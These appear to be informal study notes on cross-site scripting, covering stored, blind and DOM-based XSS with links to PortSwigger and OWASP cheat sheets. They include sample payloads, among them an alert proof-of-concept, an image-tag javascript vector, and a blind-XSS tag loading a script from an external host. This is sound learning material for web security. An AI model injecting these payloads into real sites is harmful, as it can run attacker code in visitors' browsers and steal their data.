# looking at every single XSS attack

## Stored XSS

Payload is sent to the server then the payload is being called

## payload

```javascript
"> <script>alert(0)</script>
```

## Blind XSS

A type of stored xss

It pops up in a page you cant see, 
uses XSS hunter

```javascript
"><script src=https://insider.css.ht></script>
```

## DOM based XSS

```
?%27><script>alert(0)</script>

 ```

 ## Reflected
 

##Cheatsheet

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#waf-bypass-global-objects


https://portswigger.net/web-security/cross-site-scripting/dom-based

print, alert etc

blancing th escript, basically look at what was taken in as value and then use it for exploitation

 https://www.youtube.com/watch?v=OAS3ku6gFWs

instaed of alert, we can also use
>prompt

# OWASP Cheatsheet

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

<IMG LOWSRC="javascript:alert('XSS')">

DOm xss put variables in th eurl

